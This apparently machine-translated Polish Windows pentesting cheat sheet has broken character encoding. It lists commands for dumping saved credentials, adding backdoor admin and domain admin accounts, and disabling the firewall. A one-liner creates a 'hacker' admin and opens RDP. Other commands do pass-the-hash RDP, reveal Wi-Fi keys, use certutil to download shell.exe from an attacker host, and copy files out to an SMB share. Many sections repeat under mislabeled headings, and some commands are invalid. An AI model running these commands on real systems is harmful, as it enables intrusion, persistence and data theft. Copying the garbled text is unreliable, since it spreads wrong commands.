Credentials (poÅ›wiadczenia) to informacje uwierzytelniajÄ…ce, ktÃ³re sÄ… uÅ¼ywane do potwierdzenia toÅ¼samoÅ›ci uÅ¼ytkownika. MogÄ… to byÄ‡ nazwy uÅ¼ytkownikÃ³w, hasÅ‚a, klucze API, certyfikaty SSL itp. W kontekÅ›cie pentestÃ³w, zdobycie poÅ›wiadczeÅ„ moÅ¼e umoÅ¼liwiÄ‡ hakerowi uzyskanie nieautoryzowanego dostÄ™pu do systemu lub aplikacji. Istnieje wiele technik, ktÃ³re mogÄ… byÄ‡ wykorzystane do zdobycia poÅ›wiadczeÅ„, takich jak ataki brute force, phishing, keylogging, sniffing itp. Dlatego waÅ¼ne jest, aby chroniÄ‡ swoje poÅ›wiadczenia i stosowaÄ‡ odpowiednie zabezpieczenia, takie jak silne hasÅ‚a, autoryzacja dwuskÅ‚adnikowa itp.

```bash
cmdkey /list #List credential
vaultcmd /listcreds:"Windows Credentials" /all #List Windows vault
rundll32 keymgr.dll, KRShowKeyMgr #You need graphical access
```

### TrwaÅ‚oÅ›Ä‡ z uÅ¼ytkownikami

#### UtwÃ³rz nowego uÅ¼ytkownika

```bash
net user <nazwa_uÅ¼ytkownika> <hasÅ‚o> /add
```

#### Dodaj uÅ¼ytkownika do grupy administratorÃ³w

```bash
net localgroup administrators <nazwa_uÅ¼ytkownika> /add
```

#### Dodaj uÅ¼ytkownika do grupy zdalnego pulpitu

```bash
net localgroup "Remote Desktop Users" <nazwa_uÅ¼ytkownika> /add
```

#### Dodaj uÅ¼ytkownika do grupy uÅ¼ytkownikÃ³w zdalnych

```bash
net localgroup "Remote Desktop Users" <nazwa_uÅ¼ytkownika> /add
```

#### UtwÃ³rz nowÄ… usÅ‚ugÄ™

```bash
sc create <nazwa_usÅ‚ugi> binPath= "<Å›cieÅ¼ka_do_pliku>" start= auto
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w

```bash
sc config <nazwa_usÅ‚ugi> obj= ".\ <nazwa_uÅ¼ytkownika>" password= "<hasÅ‚o>"
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami administratora

```bash
sc config <nazwa_usÅ‚ugi> obj= ".\ <nazwa_uÅ¼ytkownika>" password= "<hasÅ‚o>" type= own type= interact
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami systemowymi

```bash
sc config <nazwa_usÅ‚ugi> obj= "LocalSystem" password= ""
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami lokalnego systemu

```bash
sc config <nazwa_usÅ‚ugi> obj= "NT AUTHORITY\LocalService" password= ""
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami sieciowymi

```bash
sc config <nazwa_usÅ‚ugi> obj= "NT AUTHORITY\NetworkService" password= ""
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami administratora i interakcjÄ… z pulpitem

```bash
sc config <nazwa_usÅ‚ugi> obj= ".\ <nazwa_uÅ¼ytkownika>" password= "<hasÅ‚o>" type= own type= interact
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami systemowymi i interakcjÄ… z pulpitem

```bash
sc config <nazwa_usÅ‚ugi> obj= "LocalSystem" password= "" type= interact
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami lokalnego systemu i interakcjÄ… z pulpitem

```bash
sc config <nazwa_usÅ‚ugi> obj= "NT AUTHORITY\LocalService" password= "" type= interact
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami sieciowymi i interakcjÄ… z pulpitem

```bash
sc config <nazwa_usÅ‚ugi> obj= "NT AUTHORITY\NetworkService" password= "" type= interact
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami administratora i interakcjÄ… z pulpitem

```bash
sc config <nazwa_usÅ‚ugi> obj= ".\ <nazwa_uÅ¼ytkownika>" password= "<hasÅ‚o>" type= own type= interact
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami systemowymi i interakcjÄ… z pulpitem

```bash
sc config <nazwa_usÅ‚ugi> obj= "LocalSystem" password= "" type= interact
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami lokalnego systemu i interakcjÄ… z pulpitem

```bash
sc config <nazwa_usÅ‚ugi> obj= "NT AUTHORITY\LocalService" password= "" type= interact
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami sieciowymi i interakcjÄ… z pulpitem

```bash
sc config <nazwa_usÅ‚ugi> obj= "NT AUTHORITY\NetworkService" password= "" type= interact
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami administratora i interakcjÄ… z pulpitem

```bash
sc config <nazwa_usÅ‚ugi> obj= ".\ <nazwa_uÅ¼ytkownika>" password= "<hasÅ‚o>" type= own type= interact
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami systemowymi i interakcjÄ… z pulpitem

```bash
sc config <nazwa_usÅ‚ugi> obj= "LocalSystem" password= "" type= interact
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami lokalnego systemu i interakcjÄ… z pulpitem

```bash
sc config <nazwa_usÅ‚ugi> obj= "NT AUTHORITY\LocalService" password= "" type= interact
```

#### Dodaj uÅ¼ytkownika do grupy usÅ‚ugodawcÃ³w z uprawnieniami sieciowymi i interakcjÄ… z pulpitem

```bash
sc config <nazwa_usÅ‚ugi> obj= "NT AUTHORITY\NetworkService" password= "" type= interact
```

```bash
# Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD

# Add user to insteresting groups:
net localgroup "Remote Desktop Users" UserLoginName  /add
net localgroup "Debugger users" UserLoginName /add
net localgroup "Power users" UserLoginName /add
```

## SieÄ‡

### Interfejsy, trasy, porty, hosty i pamiÄ™Ä‡ podrÄ™czna DNS

#### Interfejsy

Aby wyÅ›wietliÄ‡ informacje o interfejsach sieciowych, uÅ¼yj polecenia `ipconfig`:

```plaintext
ipconfig
```

#### Trasy

Aby wyÅ›wietliÄ‡ tablicÄ™ tras, uÅ¼yj polecenia `route print`:

```plaintext
route print
```

#### Porty

Aby sprawdziÄ‡ otwarte porty na hoÅ›cie, uÅ¼yj polecenia `netstat`:

```plaintext
netstat -ano
```

#### Hosty

Aby sprawdziÄ‡ listÄ™ hostÃ³w w sieci, uÅ¼yj polecenia `arp`:

```plaintext
arp -a
```

#### PamiÄ™Ä‡ podrÄ™czna DNS

Aby wyczyÅ›ciÄ‡ pamiÄ™Ä‡ podrÄ™cznÄ… DNS, uÅ¼yj polecenia `ipconfig`:

```plaintext
ipconfig /flushdns
```

```bash
ipconfig /all #Info about interfaces
route print #Print available routes
arp -a #Know hosts
netstat -ano #Opened ports?
type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
```

### Zapora ogniowa

Firewall (zapora ogniowa) to narzÄ™dzie oprogramowania lub sprzÄ™tu, ktÃ³re kontroluje ruch sieciowy miÄ™dzy sieciÄ… wewnÄ™trznÄ… a zewnÄ™trznÄ…. Jego gÅ‚Ã³wnym celem jest ochrona sieci przed nieautoryzowanym dostÄ™pem i atakami z zewnÄ…trz.

#### Typy zapÃ³r ogniowych

1. **Zapora ogniowa na poziomie sieci** (Network-level firewall): Pracuje na warstwie sieciowej modelu OSI i kontroluje ruch na podstawie adresÃ³w IP i portÃ³w. MoÅ¼e blokowaÄ‡ lub zezwalaÄ‡ na ruch na podstawie okreÅ›lonych reguÅ‚.
2. **Zapora ogniowa na poziomie aplikacji** (Application-level firewall): Pracuje na wyÅ¼szych warstwach modelu OSI i analizuje dane w pakietach sieciowych. MoÅ¼e rozpoznawaÄ‡ i blokowaÄ‡ konkretne typy atakÃ³w, takie jak ataki DDoS czy prÃ³by wykorzystania podatnoÅ›ci w aplikacjach.

#### Konfiguracja zapory ogniowej

Konfiguracja zapory ogniowej obejmuje okreÅ›lenie reguÅ‚, ktÃ³re okreÅ›lajÄ…, jakie rodzaje ruchu sÄ… dozwolone lub blokowane. ReguÅ‚y mogÄ… byÄ‡ oparte na adresach IP, portach, protokoÅ‚ach i innych czynnikach. WaÅ¼ne jest, aby skonfigurowaÄ‡ zaporÄ™ ogniowÄ… zgodnie z zasadami bezpieczeÅ„stwa i wymaganiami sieci.

#### Zalety zapory ogniowej

* Ochrona przed nieautoryzowanym dostÄ™pem do sieci.
* Blokowanie atakÃ³w z zewnÄ…trz.
* Kontrola ruchu sieciowego.
* ZwiÄ™kszenie bezpieczeÅ„stwa sieci.

#### Wnioski

Zapora ogniowa jest niezbÄ™dnym narzÄ™dziem w zabezpieczaniu sieci przed atakami z zewnÄ…trz. Poprawna konfiguracja i regularne aktualizacje sÄ… kluczowe dla utrzymania wysokiego poziomu bezpieczeÅ„stwa sieci.

```bash
netsh firewall show state # FW info, open ports
netsh advfirewall firewall show rule name=all
netsh firewall show config # FW info
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off  #Turn Off
NetSh Advfirewall set allprofiles state on  #Trun On
netsh firewall set opmode disable #Turn Off

#How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop"

#Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed

#Enable Remote Desktop with wmic
wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
##or
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

#Enable Remote assistance:
reg add â€œHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Serverâ€ /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

::Connect to RDP (using hash or password)
xfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
```

### UdostÄ™pnienia

#### WyÅ›wietlanie udostÄ™pnionych zasobÃ³w

Aby wyÅ›wietliÄ‡ listÄ™ udostÄ™pnionych zasobÃ³w na komputerze, uÅ¼yj polecenia `net share`:

```plaintext
net share
```

#### Tworzenie nowego udostÄ™pnienia

Aby utworzyÄ‡ nowe udostÄ™pnienie, uÅ¼yj polecenia `net share` z odpowiednimi parametrami. Na przykÅ‚ad, aby utworzyÄ‡ udostÄ™pnienie o nazwie "Dane" dla folderu "C:\Dane", wykonaj nastÄ™pujÄ…ce polecenie:

```plaintext
net share Dane=C:\Dane
```

#### Usuwanie udostÄ™pnienia

Aby usunÄ…Ä‡ istniejÄ…ce udostÄ™pnienie, uÅ¼yj polecenia `net share` z odpowiednim parametrem `/delete`. Na przykÅ‚ad, aby usunÄ…Ä‡ udostÄ™pnienie o nazwie "Dane", wykonaj nastÄ™pujÄ…ce polecenie:

```plaintext
net share Dane /delete
```

#### Modyfikowanie udostÄ™pnienia

Aby zmodyfikowaÄ‡ istniejÄ…ce udostÄ™pnienie, uÅ¼yj polecenia `net share` z odpowiednimi parametrami. Na przykÅ‚ad, aby zmieniÄ‡ Å›cieÅ¼kÄ™ folderu dla udostÄ™pnienia o nazwie "Dane" na "C:\NoweDane", wykonaj nastÄ™pujÄ…ce polecenie:

```plaintext
net share Dane=C:\NoweDane /remark:"Nowe udostÄ™pnienie"
```

#### WyÅ‚Ä…czanie udostÄ™pniania

Aby wyÅ‚Ä…czyÄ‡ udostÄ™pnianie dla danego zasobu, uÅ¼yj polecenia `net share` z odpowiednim parametrem `/delete`. Na przykÅ‚ad, aby wyÅ‚Ä…czyÄ‡ udostÄ™pnianie dla udostÄ™pnienia o nazwie "Dane", wykonaj nastÄ™pujÄ…ce polecenie:

```plaintext
net share Dane /delete
```

#### Zabezpieczanie udostÄ™pnienia

Aby zabezpieczyÄ‡ udostÄ™pnienie, moÅ¼esz skonfigurowaÄ‡ odpowiednie uprawnienia dostÄ™pu. MoÅ¼esz to zrobiÄ‡ za pomocÄ… interfejsu graficznego lub polecenia `icacls`. Na przykÅ‚ad, aby udostÄ™pniÄ‡ folder "C:\Dane" tylko dla uÅ¼ytkownika "User1" z peÅ‚nym dostÄ™pem, wykonaj nastÄ™pujÄ…ce polecenie:

```plaintext
icacls C:\Dane /grant User1:(OI)(CI)F
```

#### Wykorzystywanie udostÄ™pnionych zasobÃ³w

Aby uzyskaÄ‡ dostÄ™p do udostÄ™pnionych zasobÃ³w na innym komputerze, moÅ¼esz uÅ¼yÄ‡ polecenia `net use`. Na przykÅ‚ad, aby podÅ‚Ä…czyÄ‡ udostÄ™pnienie o nazwie "Dane" z komputera "192.168.0.100" jako dysk "Z:", wykonaj nastÄ™pujÄ…ce polecenie:

```plaintext
net use Z: \\192.168.0.100\Dane
```

#### WyÅ‚Ä…czanie udostÄ™pniania

Aby wyÅ‚Ä…czyÄ‡ udostÄ™pnianie dla danego zasobu, uÅ¼yj polecenia `net share` z odpowiednim parametrem `/delete`. Na przykÅ‚ad, aby wyÅ‚Ä…czyÄ‡ udostÄ™pnianie dla udostÄ™pnienia o nazwie "Dane", wykonaj nastÄ™pujÄ…ce polecenie:

```plaintext
net share Dane /delete
```

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### Wifi

#### Wyszukiwanie dostÄ™pnych sieci wifi

Aby zobaczyÄ‡ dostÄ™pne sieci wifi w Twoim zasiÄ™gu, wykonaj poniÅ¼szÄ… komendÄ™:

```plaintext
netsh wlan show networks
```

#### PodÅ‚Ä…czanie do sieci wifi

Aby podÅ‚Ä…czyÄ‡ siÄ™ do konkretnej sieci wifi, uÅ¼yj poniÅ¼szej komendy, zastÄ™pujÄ…c `nazwa_sieci` i `hasÅ‚o` odpowiednimi danymi:

```plaintext
netsh wlan connect ssid=nazwa_sieci name=nazwa_sieci key=hasÅ‚o
```

#### RozÅ‚Ä…czanie z sieci wifi

Aby rozÅ‚Ä…czyÄ‡ siÄ™ z aktualnie podÅ‚Ä…czonÄ… sieciÄ… wifi, wykonaj poniÅ¼szÄ… komendÄ™:

```plaintext
netsh wlan disconnect
```

#### WyÅ‚Ä…czanie karty sieciowej wifi

Aby wyÅ‚Ä…czyÄ‡ kartÄ™ sieciowÄ… wifi, uÅ¼yj poniÅ¼szej komendy:

```plaintext
netsh interface set interface "Nazwa karty sieciowej" admin=disable
```

#### WÅ‚Ä…czanie karty sieciowej wifi

Aby wÅ‚Ä…czyÄ‡ kartÄ™ sieciowÄ… wifi, uÅ¼yj poniÅ¼szej komendy:

```plaintext
netsh interface set interface "Nazwa karty sieciowej" admin=enable
```

#### Resetowanie ustawieÅ„ sieciowych wifi

Aby zresetowaÄ‡ ustawienia sieciowe wifi, wykonaj poniÅ¼szÄ… komendÄ™:

```plaintext
netsh winsock reset
```

#### WyÅ‚Ä…czanie udostÄ™pniania sieci wifi

Aby wyÅ‚Ä…czyÄ‡ udostÄ™pnianie sieci wifi, uÅ¼yj poniÅ¼szej komendy:

```plaintext
netsh wlan set hostednetwork mode=disallow
```

#### WÅ‚Ä…czanie udostÄ™pniania sieci wifi

Aby wÅ‚Ä…czyÄ‡ udostÄ™pnianie sieci wifi, uÅ¼yj poniÅ¼szej komendy:

```plaintext
netsh wlan set hostednetwork mode=allow ssid=nazwa_sieci key=hasÅ‚o
```

#### Sprawdzanie informacji o karcie sieciowej wifi

Aby sprawdziÄ‡ informacje o karcie sieciowej wifi, wykonaj poniÅ¼szÄ… komendÄ™:

```plaintext
netsh wlan show interface
```

#### Sprawdzanie informacji o poÅ‚Ä…czeniu wifi

Aby sprawdziÄ‡ informacje o aktualnym poÅ‚Ä…czeniu wifi, wykonaj poniÅ¼szÄ… komendÄ™:

```plaintext
netsh wlan show profile name=nazwa_sieci key=clear
```

#### Zmiana ustawieÅ„ sieci wifi

Aby zmieniÄ‡ ustawienia sieci wifi, uÅ¼yj poniÅ¼szej komendy, zastÄ™pujÄ…c `nazwa_sieci` i `hasÅ‚o` odpowiednimi danymi:

```plaintext
netsh wlan set profileparameter name=nazwa_sieci keyMaterial=hasÅ‚o
```

```bash
netsh wlan show profile #AP SSID
netsh wlan show profile <SSID> key=clear #Get Cleartext Pass
```

### SNMP

SNMP (Simple Network Management Protocol) jest protokoÅ‚em sieciowym uÅ¼ywanym do zarzÄ…dzania i monitorowania urzÄ…dzeÅ„ sieciowych. Pozwala na zdalne monitorowanie i kontrolÄ™ urzÄ…dzeÅ„ takich jak routery, przeÅ‚Ä…czniki, serwery itp. ProtokÃ³Å‚ SNMP dziaÅ‚a na zasadzie zapytanie-odpowiedÅº, gdzie menedÅ¼er SNMP wysyÅ‚a zapytania do agenta SNMP, a ten zwraca odpowiedzi zawierajÄ…ce informacje o stanie urzÄ…dzenia.

#### Podstawowe komendy SNMP

* `snmpwalk` - sÅ‚uÅ¼y do pobierania informacji o wszystkich obiektach w drzewie MIB (Management Information Base) na danym urzÄ…dzeniu.
* `snmpget` - sÅ‚uÅ¼y do pobierania wartoÅ›ci konkretnego obiektu MIB na danym urzÄ…dzeniu.
* `snmpset` - sÅ‚uÅ¼y do ustawiania wartoÅ›ci konkretnego obiektu MIB na danym urzÄ…dzeniu.
* `snmptrap` - sÅ‚uÅ¼y do wysyÅ‚ania puÅ‚apek SNMP (trap) do menedÅ¼era SNMP w celu powiadomienia o zdarzeniach na urzÄ…dzeniu.

#### PrzykÅ‚ady uÅ¼ycia

PoniÅ¼ej przedstawiam kilka przykÅ‚adÃ³w uÅ¼ycia podstawowych komend SNMP:

* `snmpwalk -v2c -c public 192.168.1.1` - wykonuje peÅ‚ne przeszukiwanie drzewa MIB na urzÄ…dzeniu o adresie IP 192.168.1.1, uÅ¼ywajÄ…c wersji 2c protokoÅ‚u SNMP i publicznego community stringa.
* `snmpget -v2c -c private 192.168.1.1 sysDescr.0` - pobiera wartoÅ›Ä‡ obiektu sysDescr.0 (opis systemu) na urzÄ…dzeniu o adresie IP 192.168.1.1, uÅ¼ywajÄ…c wersji 2c protokoÅ‚u SNMP i prywatnego community stringa.
* `snmpset -v2c -c private 192.168.1.1 sysContact.0 s "admin@example.com"` - ustawia wartoÅ›Ä‡ obiektu sysContact.0 (kontakt administratora) na urzÄ…dzeniu o adresie IP 192.168.1.1, uÅ¼ywajÄ…c wersji 2c protokoÅ‚u SNMP, prywatnego community stringa i podanego adresu e-mail.
* `snmptrap -v2c -c public 192.168.1.2 192.168.1.1 1.3.6.1.2.1.1.6.0 s "Device rebooted"` - wysyÅ‚a puÅ‚apkÄ™ SNMP do urzÄ…dzenia o adresie IP 192.168.1.2, informujÄ…c o restarcie urzÄ…dzenia o adresie IP 192.168.1.1, uÅ¼ywajÄ…c wersji 2c protokoÅ‚u SNMP, publicznego community stringa i podanego komunikatu.

```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```

### Interfejsy sieciowe

#### WyÅ›wietlanie informacji o interfejsach sieciowych

Aby wyÅ›wietliÄ‡ informacje o dostÄ™pnych interfejsach sieciowych, moÅ¼esz uÅ¼yÄ‡ polecenia `ipconfig` lub `ifconfig`, w zaleÅ¼noÅ›ci od systemu operacyjnego.

```plaintext
ipconfig
```

```plaintext
ifconfig
```

#### WyÅ‚Ä…czanie interfejsu sieciowego

Aby wyÅ‚Ä…czyÄ‡ interfejs sieciowy, moÅ¼esz uÅ¼yÄ‡ polecenia `netsh` w systemie Windows lub polecenia `ifconfig` w systemie Linux.

```plaintext
netsh interface set interface "Nazwa interfejsu" admin=disable
```

```plaintext
ifconfig "Nazwa interfejsu" down
```

#### WÅ‚Ä…czanie interfejsu sieciowego

Aby wÅ‚Ä…czyÄ‡ interfejs sieciowy, moÅ¼esz uÅ¼yÄ‡ polecenia `netsh` w systemie Windows lub polecenia `ifconfig` w systemie Linux.

```plaintext
netsh interface set interface "Nazwa interfejsu" admin=enable
```

```plaintext
ifconfig "Nazwa interfejsu" up
```

#### Zmiana adresu MAC interfejsu sieciowego

Aby zmieniÄ‡ adres MAC interfejsu sieciowego, moÅ¼esz uÅ¼yÄ‡ polecenia `netsh` w systemie Windows lub polecenia `ifconfig` w systemie Linux.

```plaintext
netsh interface set interface "Nazwa interfejsu" newmac=XX-XX-XX-XX-XX-XX
```

```plaintext
ifconfig "Nazwa interfejsu" hw ether XX:XX:XX:XX:XX:XX
```

#### Ustawianie adresu IP interfejsu sieciowego

Aby ustawiÄ‡ adres IP interfejsu sieciowego, moÅ¼esz uÅ¼yÄ‡ polecenia `netsh` w systemie Windows lub polecenia `ifconfig` w systemie Linux.

```plaintext
netsh interface ip set address "Nazwa interfejsu" static IP_ADDRESS MASK GATEWAY
```

```plaintext
ifconfig "Nazwa interfejsu" IP_ADDRESS netmask MASK
```

#### Ustawianie serwera DNS dla interfejsu sieciowego

Aby ustawiÄ‡ serwer DNS dla interfejsu sieciowego, moÅ¼esz uÅ¼yÄ‡ polecenia `netsh` w systemie Windows lub polecenia `ifconfig` w systemie Linux.

```plaintext
netsh interface ip set dns "Nazwa interfejsu" static DNS_SERVER
```

```plaintext
ifconfig "Nazwa interfejsu" dns-nameservers DNS_SERVER
```

#### WyÅ›wietlanie tablicy routingu

Aby wyÅ›wietliÄ‡ tablicÄ™ routingu, moÅ¼esz uÅ¼yÄ‡ polecenia `route` w systemie Windows lub polecenia `ip route` w systemie Linux.

```plaintext
route print
```

```plaintext
ip route show
```

```bash
ipconfig /all
```

### Tabela ARP

Tabela ARP (Address Resolution Protocol) zawiera informacje o mapowaniu adresÃ³w IP na adresy MAC w sieci lokalnej. Jest to waÅ¼ne narzÄ™dzie dla pentesterÃ³w, ktÃ³re umoÅ¼liwia identyfikacjÄ™ urzÄ…dzeÅ„ w sieci oraz potencjalne ataki typu ARP spoofing. Aby wyÅ›wietliÄ‡ zawartoÅ›Ä‡ tabeli ARP w systemie Windows, moÅ¼na uÅ¼yÄ‡ polecenia `arp -a` w wierszu poleceÅ„. PoniÅ¼ej przedstawiono przykÅ‚adowy wynik:

```
Interface: 192.168.1.2 --- 0x2
  Internet Address      Physical Address      Type
  192.168.1.1           00-11-22-33-44-55     dynamic
  192.168.1.100         00-AA-BB-CC-DD-EE     dynamic
```

Wynik ten pokazuje adresy IP i odpowiadajÄ…ce im adresy MAC urzÄ…dzeÅ„ w sieci. Adresy MAC mogÄ… byÄ‡ dynamiczne lub statyczne, w zaleÅ¼noÅ›ci od sposobu przydzielania adresÃ³w IP w sieci.

```bash
arp -A
```

## Pobierz

Bitsadmin.exe

```
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```

CertReq.exe jest narzÄ™dziem wiersza poleceÅ„, ktÃ³re jest dostÄ™pne w systemach Windows i sÅ‚uÅ¼y do zarzÄ…dzania certyfikatami. MoÅ¼e byÄ‡ uÅ¼ywane do generowania Å¼Ä…daÅ„ certyfikatÃ³w, importowania i eksportowania certyfikatÃ³w oraz zarzÄ…dzania magazynami certyfikatÃ³w. PoniÅ¼ej przedstawiam kilka przykÅ‚adÃ³w uÅ¼ycia CertReq.exe:

### Generowanie Å¼Ä…dania certyfikatu

```
CertReq.exe -new request.inf request.req
```

### Importowanie certyfikatu

```
CertReq.exe -accept cert.cer
```

### Eksportowanie certyfikatu

```
CertReq.exe -export cert.cer cert.pfx
```

### WyÅ›wietlanie informacji o certyfikacie

```
CertReq.exe -dump cert.cer
```

### ZarzÄ…dzanie magazynem certyfikatÃ³w

```
CertReq.exe -store My -s "CN=CertificateStore" -f cert.cer
```

WiÄ™cej informacji na temat uÅ¼ywania CertReq.exe moÅ¼na znaleÅºÄ‡ w dokumentacji systemu Windows.

```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```

Certutil.exe jest narzÄ™dziem wiersza poleceÅ„ w systemie Windows, ktÃ³re umoÅ¼liwia zarzÄ…dzanie certyfikatami i kluczami. MoÅ¼e byÄ‡ uÅ¼ywane do wykonywania rÃ³Å¼nych operacji, takich jak importowanie i eksportowanie certyfikatÃ³w, generowanie kluczy, weryfikowanie podpisÃ³w cyfrowych i wiele innych. PoniÅ¼ej przedstawiono kilka przykÅ‚adÃ³w uÅ¼ycia certutil.exe:

1. Importowanie certyfikatu:

```
certutil -addstore nazwa_sklepu Å›cieÅ¼ka_do_certyfikatu
```

2. Eksportowanie certyfikatu:

```
certutil -exportcert -f -p hasÅ‚o -privatekey -user -t "CERTIFICATE_THUMBPRINT" Å›cieÅ¼ka_do_pliku
```

3. WyÅ›wietlanie informacji o certyfikacie:

```
certutil -dump Å›cieÅ¼ka_do_certyfikatu
```

4. Generowanie nowego klucza:

```
certutil -genkey -p hasÅ‚o -user -n "nazwa_klucza" -r "nazwa_sklepu" -s "nazwa_sklepu"
```

Certutil.exe jest potÄ™Å¼nym narzÄ™dziem, ktÃ³re moÅ¼e byÄ‡ wykorzystane przez pentesterÃ³w do przeprowadzania rÃ³Å¼nych operacji zwiÄ…zanych z certyfikatami i kluczami w systemie Windows.

```
certutil.exe -urlcache -split -f "http://10.10.14.13:8000/shell.exe" s.exe
```

**ZnajdÅº znacznie wiÄ™cej, szukajÄ…c `Download` na stronie** [**https://lolbas-project.github.io**](https://lolbas-project.github.io/)

## RÃ³Å¼ne

```bash
cd #Get current dir
cd C:\path\to\dir #Change dir
dir #List current dir
dir /a:h C:\path\to\dir #List hidden files
dir /s /b #Recursive list without shit
time #Get current time
date #Get current date
shutdown /r /t 0 #Shutdown now
type <file> #Cat file

#Runas
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Hide
attrib +h file #Set Hidden
attrib -h file #Quit Hidden

#Give full control over a file that you owns
icacls <FILE_PATH> /t /e /p <USERNAME>:F
icacls <FILE_PATH> /e /r <USERNAME> #Remove the permision

#Recursive copy to smb
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.13\name\win

#exe2bat to transform exe file in bat file

#ADS
dir /r #Detect ADS
more file.txt:ads.txt #read ADS
powershell (Get-Content file.txt -Stream ads.txt)

# Get error messages from code
net helpmsg 32 #32 is the code in that case
```

### Omijanie czarnej listy znakÃ³w

W niektÃ³rych przypadkach, podczas testowania penetracyjnego, moÅ¼esz napotkaÄ‡ aplikacje, ktÃ³re blokujÄ… okreÅ›lone znaki, takie jak znaki specjalne lub znaki kontrolne. Jednak istniejÄ… sposoby na obejÅ›cie takiej czarnej listy znakÃ³w. Oto kilka technik, ktÃ³re moÅ¼esz wykorzystaÄ‡:

1. **UÅ¼ycie znakÃ³w Unicode**: MoÅ¼esz uÅ¼yÄ‡ znakÃ³w Unicode, ktÃ³re wyglÄ…dajÄ… podobnie do znakÃ³w na czarnej liÅ›cie, ale majÄ… inne kody Unicode. Na przykÅ‚ad, jeÅ›li znak `#` jest zablokowany, moÅ¼esz sprÃ³bowaÄ‡ uÅ¼yÄ‡ znaku `ï¼ƒ` (U+FF03), ktÃ³ry wyglÄ…da tak samo, ale ma inny kod Unicode.
2. **UÅ¼ycie znakÃ³w HTML**: MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ znakÃ³w HTML, ktÃ³re sÄ… zamieniane na odpowiednie znaki podczas renderowania strony. Na przykÅ‚ad, znak `#` moÅ¼e byÄ‡ zamieniony na `&#35;`, a znak `&` na `&amp;`. MoÅ¼esz sprÃ³bowaÄ‡ uÅ¼yÄ‡ tych znakÃ³w, aby obejÅ›Ä‡ czarnÄ… listÄ™.
3. **UÅ¼ycie znakÃ³w obcych**: Innym sposobem jest uÅ¼ycie znakÃ³w obcych, ktÃ³re nie sÄ… czÄ™sto uÅ¼ywane w danym jÄ™zyku. Na przykÅ‚ad, jeÅ›li aplikacja blokuje znaki specjalne, moÅ¼esz sprÃ³bowaÄ‡ uÅ¼yÄ‡ znakÃ³w z innych jÄ™zykÃ³w, takich jak chiÅ„ski, japoÅ„ski lub arabski.
